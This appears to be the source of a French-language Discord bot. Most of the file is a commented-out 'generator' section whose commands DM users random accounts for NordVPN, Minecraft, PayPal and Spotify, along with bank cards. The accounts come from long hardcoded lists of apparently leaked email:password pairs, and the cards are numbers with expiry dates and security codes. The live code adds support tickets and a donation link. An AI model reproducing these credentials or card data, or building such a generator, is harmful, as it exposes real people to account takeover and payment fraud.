  "mckayjunk@gmail.com:high11",
  "bob.coolguy@gmail.com:wigglemania",
  "ilya-gallyamov@mail.ru:121201ilya",
  "b.case@aggiemail.usu.edu:14cousins",
  "natalia.kempin@googlemail.com:livenet666",
  "bach.oliver3@gmail.com:Futte2606",
  "jza162001@yahoo.com:password6",
  "higsonadam1905@gmail.com:amarett0",
  "rachael_pang@hotmail.com:322454653",
  "izwan00@gmail.com:hell4se68",
  "dirtyzed@hotmail.com:piazza",
  "k.soezbilen@hotmail.de:f4fe7dca",
  "semihsari@hotmail.de:semih9988",
  "djones5qvc@gmail.com:bronco95",
  "msomfa@gmail.com:mso101089",
  "arlindo.mieiro@gmail.com:miguel07",
  "marvinminato@hotmail.de:Ronaldo12",
  "fetchek@gmail.com:fetche4ever",
  "g_souza9@hotmail.com:51fsc345",
  "farad@alhusaini.org:200776"       //ne pas mettre de virgule "," pour le dernier compte 
  ];
  
  let randomAnswerPicker = answers[Math.floor(Math.random() * answers.length)];
    const embed = new Discord.RichEmbed()
    .setFooter("Copyright © 2019 Endorium")
    .addField('Voici ton compte NordVPN(attention ils ne sont pas garantit !): ',
    randomAnswerPicker)
   .setColor("RANDOM")
        .setImage("https://www.google.com/imgres?imgurl=https%3A%2F%2Fwww.nosoftwarepatents.com%2Fwp-content%2Fuploads%2F2018%2F07%2FCLogo-NordVPN.jpg&imgrefurl=https%3A%2F%2Fwww.nosoftwarepatents.com%2Favis-nordvpn%2F&docid=6sDALuZf81M-4M&tbnid=b7OqUy5SKQHDsM%3A&vet=10ahUKEwik5e_F2LXhAhXF6OAKHdXRABQQMwhAKAEwAQ..i&w=250&h=250&bih=789&biw=1600&q=logo%20nordvpn&ved=0ahUKEwik5e_F2LXhAhXF6OAKHdXRABQQMwhAKAEwAQ&iact=mrc&uact=8" )
        .setTimestamp(15000)
  msg.channel.send(`**ton compte a bien été généré va voir tes mp **📥🔖`);
  msg.author.send({embed})
  }
  
  }
});








bot.on('message', msg => {
  if(msg.author.bot) return;

  if(msg.channel.type === "dm") return; //empeche d'exécuter les commandes en dm

  if (msg.content === '+minecraft') { //commande a exécuté
    if (msg.channel.name === "générateur"){ //obligatoirement dans un salon qui se nome générateur (vous pouvez le modifier)

var answers = [

//il faut mettre tout les compte entre des ' ' !

"sknauer@mac.com:beehive6624",
"F5_Lakers@hotmail.com:ethanhunt",
"fadi.mandura@gmail.com:Darrelabbot710",
"shre11@yahoo.com:3333ws",
"johnrvw@yahoo.com:osan2621",
"Cubi2011@web.de:12345ert",
"brilgermanotta@yahoo.com:96799834",
"rafaell.rcmr@gmail.com:64746347",
"jeffrey823@gmail.com:Medical989",
"rezamatrix@gmail.com:reza2106",
"jinjyjjin@sina.com:1300312jin",
"skasselakis1@gmail.com:Merrill10",
"markie610@gmail.com:gajunia5",
"abnoutlaw@gmail.com:whutitdew2",
"ronlessel@yahoo.com:1q2w3e4r",
"arsencameron222@gmail.com:arsenlol123",
"jonas_mts@hotmail.com:ivaneide",
"anabeatricepa408@gmail.com:yasminpr",
"greg.james.miller@gmail.com:kfnmertn",
"keelycrum@gmail.com:launchpad",
"rubalo@gmail.com:platinum",
"dfmickey@gmail.com:brittany",
"eyamie@gmail.com:reggie",
"anime.lovers@mail.ru:maks223223445",
"tulaihia@gmail.com:kainkain",
"hicham.guer@gmail.com:29121984",
"bitch@bitch.com:bitch",
"barrgeorgie@gmail.com:Georgie1101",
"myonghwi@gmail.com:hanazono",
"Joshua83@gmail.com:biochem3",
"eren.sergen@googlemail.com:metin2acc",
"caio_zoboli@hotmail.com:b9w8b9j4",
"tevanromero@yahoo.com:ella5525",
"usakokonchan@gmail.com:75365259",
"christian-nack@hotmail.de:ff125135",
"androonguyen@gmail.com:beuscher",
"bodeysobhy112@gmail.com:Sobhy321",
"eduardosandovalgomeza@gmail.com",
"javier_beltran87@yahoo.com:alexcia30",
"elias_bougharios@hotmail.com:popper12345",
"smejkalkurtis@gmail.com:061188Ks",
"c.h.steveip@gmail.com:2oo9145932",
"christofermvieta@gmail.com:vifarm01",
"crtrdn@gmail.com:cr54tr78dn",
"ali_mak46@yahoo.com:123233",
"alizzz94@yahoo.com:777777",
"alliabrar@gmail.com:titanic02",
"neilmpenney@hotmail.com:nempen87",
"gx@live.com.sg:lovezick98",
"johnwklee@yahoo.com:jl230891",
"kiwilicous_kiwi@hotmail.com:woaainee",
"jiuwai@gmail.com:oicla999",
"mckayjunk@gmail.com:high11",
"bob.coolguy@gmail.com:wigglemania",
"ilya-gallyamov@mail.ru:121201ilya",
"b.case@aggiemail.usu.edu:14cousins",
"natalia.kempin@googlemail.com:livenet666",
"bach.oliver3@gmail.com:Futte2606",
"jza162001@yahoo.com:password6",
"higsonadam1905@gmail.com:amarett0",
"rachael_pang@hotmail.com:322454653",
"izwan00@gmail.com:hell4se68",
"dirtyzed@hotmail.com:piazza",
"k.soezbilen@hotmail.de:f4fe7dca",
"semihsari@hotmail.de:semih9988",
"djones5qvc@gmail.com:bronco95",
"msomfa@gmail.com:mso101089",
"arlindo.mieiro@gmail.com:miguel07",
"marvinminato@hotmail.de:Ronaldo12",
"fetchek@gmail.com:fetche4ever",
"g_souza9@hotmail.com:51fsc345",
"farad@alhusaini.org:200776"       //ne pas mettre de virgule "," pour le dernier compte 
];

let randomAnswerPicker = answers[Math.floor(Math.random() * answers.length)];
  const embed = new Discord.RichEmbed()
  .setFooter("Copyright © 2019 Endorium")
  .addField('Voici ton compte Minecraft(attention ils ne sont pas garantit !): ',
  randomAnswerPicker)
 .setColor("RANDOM")
      .setImage("https://www.google.com/imgres?imgurl=https%3A%2F%2Fi.pinimg.com%2Foriginals%2Fb8%2F10%2F2b%2Fb8102bc2860e12cf9b5d54a1f9f068bd.jpg&imgrefurl=https%3A%2F%2Fwww.pinterest.com%2Fpin%2F689121180454480736%2F&docid=CQIuvoZWuwMb6M&tbnid=C49do5wlfY62hM%3A&vet=10ahUKEwjdwJGi4r3hAhW2QxUIHSxMDMwQMwhNKA4wDg..i&w=1200&h=900&bih=740&biw=1600&q=logo%20minecraft&ved=0ahUKEwjdwJGi4r3hAhW2QxUIHSxMDMwQMwhNKA4wDg&iact=mrc&uact=8" )
      .setTimestamp(15000)
msg.channel.send(`**ton compte a bien été généré va voir tes mp **📥🔖`);
msg.author.send({embed})
}

}
});




























bot.on('message', msg => {
  if(msg.author.bot) return;

  if(msg.channel.type === "dm") return; //empeche d'exécuter les commandes en dm

  if (msg.content === '+paypal') { //commande a exécuté
    if (msg.channel.name === "générateur"){ //obligatoirement dans un salon qui se nome générateur (vous pouvez le modifier)

var answers = [

//il faut mettre tout les compte entre des ' ' !
"ansgar_bussmann@freenet.de:wilhelm",
"sktrash@freenet.de:sluspiku",
"nicoledeutschmann@freenet.de:nikita",
"klausdieter.gulba@freenet.de:kdg1939",
"cherokees@web.de:amiscum",
"franziskamaurer_87@web.de:jonathan05",
"franziskamaurer_87@web.de:jonathan05nicolai.walsemann@gmx.de:darkusos1",
"mirco@legionis-stuff.de:hallo987",
"nicolai.walsemann@gmx.de:darkusos1",
"leterrex@gmx.de:meinefresse",
"lets.play.shiro@outlook.de:schweizer1",
"letsdance6@web.de:dennniis",
"letshatex33@web.de:MOINSEN12",
"letshatex33@web.de:moinsen12",
"letskillsantaclaus@live.de:Kennwort",
"dwnsemail@gmail.com:megkt4395",
"letsmentary@yahoo.de:pass123wort",
"letsplay-9@web.de:179das18",
"letsplay23@hotmail.de:36610659",
"letsplay23@hotmail.de:naruto77",
"letsplay@vorsicht-bissig.de:361352927262",
"letter-x@hotmail.de:badboy123",
"letty@web.de:123456789",
"leutrim9@hotmail.de:q2w3e4r5",
"leveluphdx@hotmail.de:Jm17101996",
"levermann.neuenrade@freenet.de:levermann",
"levi.blohm@web.de:oonowrjh",
"levi66@live.de:afrika123",
"leviatharidragon@gmx.de:29Jenny88",
"levin.mohr@web.de:levinmohr",
"levin.werner@web.de:Laurin1771",
"levin@new-communication.de:levinmohr",
"levo_thirty-siixx@hotmail.de:kreuzberg36",
"levstork@web.de:jay123456",
"lewan91@gmx.de:pimmel2544",
"lex.lex4@web.de:lutzlutz",
"lexa35@hotmail.de:kawaZX12",
"lexi@web.de:maggisw554",
"lexion.580@web.de:goldpack",
"lexusdeutscher@web.de:qwedcvb1",
"lexusis300@web.de:alemdar67",
"leylalunaris@yahoo.de:blacky123",
"lg.9@hotmail.de:36ad8b5f",
"lgawlik@gmx.de:05834710",
"lghdfxlo@hotmail.de:Dumm439",
"lgrandits@yahoo.de:kuschel1991",
"lgtiger98@web.de:babolat1",
"lh@haasehome.de:ammonit123",
"liafg@hotmail.de:235d4034",
"liam-cesar@gmx.de:Lukas123",
"liamtoh_@hotmail.de:Adsfadsf123",
"liamtoh_@hotmail.de:kimberly",
"lias-heuser@gmx.de:gammi123",
"liasfh@hotmail.de:235d4034",
"libanese.player.16@hotmail.de:samuelzahn",
"libanese_2010@hotmail.de:zeaiter123",
"libanesen-boy13@hotmail.de:libanon123",
"libanon_x33@hotmail.de:gangbang",
"libe-@hotmail.de:tannenbaum",
"liberojannik@web.de:Jeffhardy1",
"libuda19041@freenet.de:schalke04",
"lexa35@hotmail.de:insidetm12"
    //ne pas mettre de virgule "," pour le dernier compte 
];

let randomAnswerPicker = answers[Math.floor(Math.random() * answers.length)];
  const embed = new Discord.RichEmbed()
  .setFooter("Copyright © 2019 Endorium")
  .addField('Voici ton compte paypal(attention ils ne sont pas garantit !): ',
  randomAnswerPicker)
 .setColor("RANDOM")
      .setImage("https://www.google.com/imgres?imgurl=https%3A%2F%2Fwww.paypalobjects.com%2Fwebstatic%2Ficon%2Fpp258.png&imgrefurl=https%3A%2F%2Fwww.paypal.com%2Ffr%2Fhome&docid=Cxc5SPv6UE6Y6M&tbnid=_bkzi8xQgG2DDM%3A&vet=10ahUKEwij_uyHr7ThAhXU8uAKHYoIB8kQMwg9KAAwAA..i&w=259&h=259&bih=789&biw=1600&q=paypal&ved=0ahUKEwij_uyHr7ThAhXU8uAKHYoIB8kQMwg9KAAwAA&iact=mrc&uact=8")
      .setTimestamp(30000)
msg.channel.send(`**ton compte a bien été généré va voir tes mp **📥🔖`);
msg.author.send({embed})
}

}
});

bot.on('message', msg => {
  if(msg.author.bot) return;

  if(msg.channel.type === "dm") return; //empeche d'exécuter les commandes en dm

  if (msg.content === '+cc') { //commande a exécuté
    if (msg.channel.name === "générateur"){ //obligatoirement dans un salon qui se nome générateur (vous pouvez le modifier)

var answers = [

//il faut mettre tout les compte entre des ' ' !
"5485128004817427|04|2022|400",
"5485123432133521|08|2022|556",
"5485125845746377|02|2022|618",
"5485127377652080|01|2022|245",
"5485128711130809|10|2022|517",
"5485123780510056|02|2022|604",
"5485126231068723|02|2022|636",
"5485128146818101|06|2022|755",
"5485124870407062|03|2022|200",
"5485120125521343|01|2022|263",
"5485123751853626|05|2022|012",
"5485122216477880|06|2022|288",
"5485122006043553|07|2022|606",
"5485123463778509|04|2022|157"
    //ne pas mettre de virgule "," pour le dernier compte 
];

let randomAnswerPicker = answers[Math.floor(Math.random() * answers.length)];
  const embed = new Discord.RichEmbed()
  .setFooter("Copyright © 2019 Endorium")
  .addField('Voici ta Carte Bleu(attention elles ne sont pas garantit !): ',
  randomAnswerPicker)
      .setColor("RANDOM")
      .setImage("")
      .setTimestamp(30000)
msg.channel.send(`**ton compte a bien été généré va voir tes mp **📥🔖`);
msg.author.send({embed})
}

}
});

bot.on('message', msg => {
  if(msg.author.bot) return;

  if(msg.channel.type === "dm") return; //empeche d'exécuter les commandes en dm

  if (msg.content === '+spotify') { //commande a exécuté
    if (msg.channel.name === "générateur"){ //obligatoirement dans un salon qui se nome générateur (vous pouvez le modifier)

var answers = [

//il faut mettre tout les compte entre des ' ' !
"ansgar_bussmann@freenet.de:wilhelm",
"sktrash@freenet.de:sluspiku",
"nicoledeutschmann@freenet.de:nikita",
"klausdieter.gulba@freenet.de:kdg1939",
"cherokees@web.de:amiscum",
"franziskamaurer_87@web.de:jonathan05",
"franziskamaurer_87@web.de:jonathan05",
"nicolai.walsemann@gmx.de:darkusos1",
"mirco@legionis-stuff.de:hallo987",
"nicolai.walsemann@gmx.de:darkusos1",
"leterrex@gmx.de:meinefresse",
"lets.play.shiro@outlook.de:schweizer1",
"letsdance6@web.de:dennniis",
"letshatex33@web.de:MOINSEN12",
"letshatex33@web.de:moinsen12",
"letskillsantaclaus@live.de:Kennwort",
"letsmentary@yahoo.de:pass123wort",
"letsplay-9@web.de:179das18",
"letsplay23@hotmail.de:36610659",
"letsplay23@hotmail.de:naruto77",
"letsplay@vorsicht-bissig.de:361352927262",
"letter-x@hotmail.de:badboy123",
"letty@web.de:123456789",
"leutrim9@hotmail.de:q2w3e4r5",
"leveluphdx@hotmail.de:Jm17101996",
"levermann.neuenrade@freenet.de:levermann",
"levi.blohm@web.de:oonowrjh",
"levi66@live.de:afrika123",
"leviatharidragon@gmx.de:29Jenny88",
"levin.mohr@web.de:levinmohr",
"levin.werner@web.de:Laurin1771",
"levin@new-communication.de:levinmohr",
"levo_thirty-siixx@hotmail.de:kreuzberg36",
"levstork@web.de:jay123456",
"lewan91@gmx.de:pimmel2544",
"lex.lex4@web.de:lutzlutz",
"lexa35@hotmail.de:kawaZX12",
"lexi@web.de:maggisw554",
"lexion.580@web.de:goldpack",
"lexusdeutscher@web.de:qwedcvb1",
"lexusis300@web.de:alemdar67",
"leylalunaris@yahoo.de:blacky123",
"lg.9@hotmail.de:36ad8b5f",
"lgawlik@gmx.de:05834710",
"lghdfxlo@hotmail.de:Dumm439",
"lgrandits@yahoo.de:kuschel1991",
"lgtiger98@web.de:babolat1",
"lh@haasehome.de:ammonit123",
"liafg@hotmail.de:235d4034",
"liam-cesar@gmx.de:Lukas123",
"liamtoh_@hotmail.de:Adsfadsf123",
"liamtoh_@hotmail.de:kimberly",
"lias-heuser@gmx.de:gammi123",
"liasfh@hotmail.de:235d4034",
"libanese.player.16@hotmail.de:samuelzahn",
"libanese_2010@hotmail.de:zeaiter123",
"libanesen-boy13@hotmail.de:libanon123",
"libanon_x33@hotmail.de:gangbang",
"libe-@hotmail.de:tannenbaum",
"liberojannik@web.de:Jeffhardy1",
"libuda19041@freenet.de:schalke04",
"lexa35@hotmail.de:insidetm12"
    //ne pas mettre de virgule "," pour le dernier compte 
];

let randomAnswerPicker = answers[Math.floor(Math.random() * answers.length)];
  const embed = new Discord.RichEmbed()
  .setFooter("Copyright © 2019 Endorium")
  .addField('Voici ton compte Spotify(attention ils ne sont pas garantit !): ',
  randomAnswerPicker)
      .setColor("RANDOM")
      .setImage("https://www.google.com/imgres?imgurl=https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Ffr%2Fd%2Fd1%2FSpotify_logo_sans_texte.svg.png&imgrefurl=https%3A%2F%2Ffr.wikipedia.org%2Fwiki%2FFichier%3ASpotify_logo_sans_texte.svg.png&docid=QM-70KOr77a2AM&tbnid=te4SqZietNuKAM%3A&vet=10ahUKEwiK34_wwLbhAhWxxYUKHVP3A24QMwhCKAMwAw..i&w=2000&h=2000&bih=789&biw=1600&q=logo%20spotify&ved=0ahUKEwiK34_wwLbhAhWxxYUKHVP3A24QMwhCKAMwAw&iact=mrc&uact=8")
      .setTimestamp(30000)
msg.channel.send(`**ton compte a bien été généré va voir tes mp **📥🔖`);
msg.author.send({embed})
}

}
});
*/
 

  if(command === "cagnotte") {
    if (message.deletable) message.delete();
      const embed = new Discord.RichEmbed()
        .setFooter("Copyright Endorium 2019")
        .addField("https://paypal.me/pools/c/8dsIJBzVSI","Pour Aidez a ce que le serveur ce developpe donne de l'argent !")
        .setColor(0x1FDDE3)
      message.channel.sendEmbed(embed)
  }



const prefix = '+';

bot.on('message', async message => { 

  if(message.author.bot) return;

  if(!message.content.startsWith(prefix)) return;

  const args = message.content.slice(prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();

  if(command === 'new'){
      var parent_channel = message.guild.channels.find(e => e.name === 'Tickets');

      const reason = message.content.split(" ").slice(1).join(" ");
      if (message.guild.channels.some(ch => ch.name === "ticket-" + message.author.id)){
          var the_channel = message.guild.channels.find(ch => ch.name === "ticket-" + message.author.id);
          return message.channel.send(`Vous avez déjà un ticket ouvert ! (`+the_channel+')');
      }
      message.guild.createChannel(`ticket-${message.author.id}`, "text").then(c => {
        c.setParent(parent_channel);
        let role = message.guild.roles.find(e => e.name === '@Admin');
        c.overwritePermissions(role, {
            SEND_MESSAGES: false,
            READ_MESSAGES: false
        });
        c.overwritePermissions(message.author, {
            SEND_MESSAGES: true,
            READ_MESSAGES: true
        });
        message.channel.send(`Votre ticket a été ouvert, <#${c.id}>.`);
        const embed = new Discord.RichEmbed()
            .setColor(0xFF0000)
            .addField(`Bienvenue ${message.author.username}!`, `Veuillez nous en dire un peu plus sur votre demande d'aide !`)
            .setTimestamp()
            .setFooter('Tape '+prefix+'close pour fermer le ticket');
        c.send(embed);
        c.send('<@&557671309321175051>')
    }).catch(console.error);
}
if(command === 'close'){
    if (!message.channel.name.startsWith(`ticket-`)) return message.channel.send(`Vous n'êtes pas dans un salon de ticket !`);
    message.channel.send(`Pour confimer tapez \`confirm\` ! Le salon sera supprimé !`)
    .then((m) => {
        message.channel.awaitMessages(response => response.content === 'confirm', {
            max: 1,
            time: 10000,
            errors: ['time'],
        })
        .then((collected) => {
            message.channel.delete();
        })
        .catch(() => {
            m.edit('Temps écoulé, annulation.').then(m2 => {
                m2.delete();
            }, 3000);
        });
    });
}
})
/*
if (decomp_msg[0] === commands_prefix + "mute") {
  if(message.member.hasPermission("MANAGE_MESSAGES")) {
    if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("Vous n'avez pas la permissions");
    let mUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]))
    if(!mUser) return message.reply("Impossible de trouv e cette personne");
    if(mUser.hasPermission("MANAGE_MESSAGES")) return message.reply("Impossible de retir  le droit de parler a cette personne.");
    let reason = args.join(" ").slice(22);
    var muteEmbed = new Discord.RichEmbed()
    .setDescription("~Mute~")
    .setColor('RANDOM')
    .addField("Utilisateur mut ",`${mUser} ID ${mUser.id}`)
    .addField("mute  par",`<@${sender.id}> ID ${sender.id}`)
    .addField("mute  de", `${message.channel.name} `)
    .addField("mute  le", `${message.createdAt} `)
    .addField("Raison", ` ${reason}.`)

    let muterole = message.guild.roles.find(`name`, "Muted");
    if(!muterole) return message.reply("Vous devriez creer le role Muted");

    let mutechannel = message.guild.channels.find(`name`, "incidents");
    if(!mutechannel) return message.reply("Impossible de trouvee le channel incidents");

    mUser.send('Oh mon dieu tu a  été  mute de ' + message.guild.name)
    message.delete()
    message.channel.send("Un joueur vien de ce faire mute !")
    mUser.addRole(muterole.id)
    mutechannel.send(muteEmbed)
    }
 }
*/
});

bot.login(config.token);